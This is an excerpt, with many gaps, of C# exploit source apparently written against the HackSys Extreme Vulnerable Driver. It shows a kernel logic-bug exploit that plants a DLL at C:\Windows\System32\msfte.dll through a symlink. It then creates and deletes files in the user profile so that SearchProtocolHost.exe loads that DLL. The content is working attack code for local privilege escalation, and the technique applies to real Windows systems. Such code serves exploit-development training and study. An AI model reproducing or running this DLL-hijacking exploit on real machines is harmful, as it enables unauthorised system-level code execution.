...
namespace InsecureKernelResourceAccess
{
    class Program
    {
       [StructLayout(LayoutKind.Sequential)]
        ...
        static void TriggerDllHijacking()
        {
            Console.WriteLine("[>] Triggering SearchProtocolHost.exe for DLL hijacking");

            string userDir = Environment.GetEnvironmentVariable("USERPROFILE");
            string filePath;

            Console.WriteLine("[>] Create and delete files under {0}", userDir);
            for (var i = 0; i < 100; i++)
            {
                filePath = string.Format("{0}\\hevdtest_{1}.txt", userDir, GetRandomString(100));
                File.WriteAllText(filePath, "Logical bugs are dangerous!");
                Thread.Sleep(10);
        ...
        static void Main(string[] args)
        {
            ...
            IntPtr hSymlink;
            string targetDll = "C:\\Windows\\System32\\msfte.dll";
            ...
            // Step 8: Trigger DLL Hijacking (SearchProtocolHost.exe)
            TriggerDllHijacking();
            Console.WriteLine("[+] Exploit is completed");
            Console.WriteLine("[*] If your DLL is not triggered, try again a few minutes later.");
        }
    }
}